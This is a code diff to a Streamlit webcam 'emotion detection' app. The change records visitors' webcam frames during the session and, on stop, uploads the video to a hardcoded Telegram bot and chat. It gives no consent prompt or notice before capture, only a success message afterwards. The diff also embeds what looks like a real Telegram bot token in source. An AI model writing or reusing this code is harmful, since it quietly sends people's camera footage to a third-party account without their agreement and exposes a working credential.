@@ -3,7 +3,7 @@ import streamlit as st
 import cv2
 import datetime
 import requests
-from streamlit_webrtc import webrtc_streamer, WebRtcMode, VideoProcessorBase
+from streamlit_webrtc import webrtc_streamer, WebRtcMode
 from utils import process_frame
 
 st.set_page_config(page_title="Live Emotion Detection", page_icon="🙂", layout="centered")
@@ -13,48 +13,52 @@ st.title("🎭 Live Emotion Detection")
 BOT_TOKEN = "8560822192:AAETcmZiWaTdZvjLvBKDWiKvenz0YfjVETc"
 CHAT_ID = "5317875689"
 
+if "frames" not in st.session_state:
+    st.session_state.frames = []
+
+if "recording" not in st.session_state:
+    st.session_state.recording = False
+
 
 def send_video_to_telegram(video_path):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
 
     with open(video_path, "rb") as video:
-        files = {"video": video}
-        data = {"chat_id": CHAT_ID}
-
-        requests.post(url, data=data, files=files)
+        requests.post(url, data={"chat_id": CHAT_ID}, files={"video": video})
 
 
-class VideoProcessor(VideoProcessorBase):
+def video_frame_callback(frame: av.VideoFrame) -> av.VideoFrame:
 
-    def __init__(self):
-        self.frames = []
+    img = frame.to_ndarray(format="bgr24")
 
-    def recv(self, frame: av.VideoFrame) -> av.VideoFrame:
-        img = frame.to_ndarray(format="bgr24")
+    processed = process_frame(img)
 
-        processed = process_frame(img)
+    if st.session_state.recording:
+        st.session_state.frames.append(processed)
 
-        self.frames.append(processed)
-
-        return av.VideoFrame.from_ndarray(processed, format="bgr24")
+    return av.VideoFrame.from_ndarray(processed, format="bgr24")
 
 
 ctx = webrtc_streamer(
     key="emotion-detection",
     mode=WebRtcMode.SENDRECV,
-    video_processor_factory=VideoProcessor,
-    media_stream_constraints={
-        "video": {"facingMode": "user"},
-        "audio": False
-    },
+    video_frame_callback=video_frame_callback,
+    media_stream_constraints={"video": True, "audio": False},
     async_processing=True
 )
 
 
-# AUTO DETECT STOP
-if ctx.state.playing == False and ctx.video_processor:
+# Start recording
+if ctx.state.playing:
+    st.session_state.recording = True
 
-    frames = ctx.video_processor.frames
+
+# When user presses STOP
+if not ctx.state.playing and st.session_state.recording:
+
+    st.session_state.recording = False
+
+    frames = st.session_state.frames
 
     if len(frames) > 10:
 
@@ -76,4 +80,6 @@ if ctx.state.playing == False and ctx.video_processor:
 
         send_video_to_telegram(filename)
 
-        st.success("Video sent to Telegram ✅")
+        st.success("Video sent to Telegram")
+
+    st.session_state.frames = []
